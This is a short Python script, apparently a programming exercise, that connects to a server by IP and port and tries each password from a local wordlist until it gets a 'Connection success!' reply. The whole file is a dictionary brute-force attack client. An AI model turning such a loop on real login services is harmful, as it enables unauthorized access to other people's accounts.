import dataclasses
import itertools as it
import socket
import argparse
import string
from sys import stderr


@dataclasses.dataclass(slots=True)
class Config:
    address: tuple[str, int]

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('ip')
        parser.add_argument('port', type=int)
        args = parser.parse_args()

        self.address = args.ip, args.port


def get_passwords():
    with open('passwords.txt') as f:
        for line in f:
            yield line


def brute_force(client):
    for candidate in get_passwords():
        client.send(candidate.encode())
        response = client.recv(1024).decode()

        match response:
            case 'Connection success!':
                print(candidate)
                break
            case 'Too many attempts.' as s:
                print(f'Error! Server response: {s}', file=stderr)
                break


def main():
    config = Config()

    with socket.socket() as client:
        client.connect(config.address)

        brute_force(client)


if __name__ == "__main__":
    main()
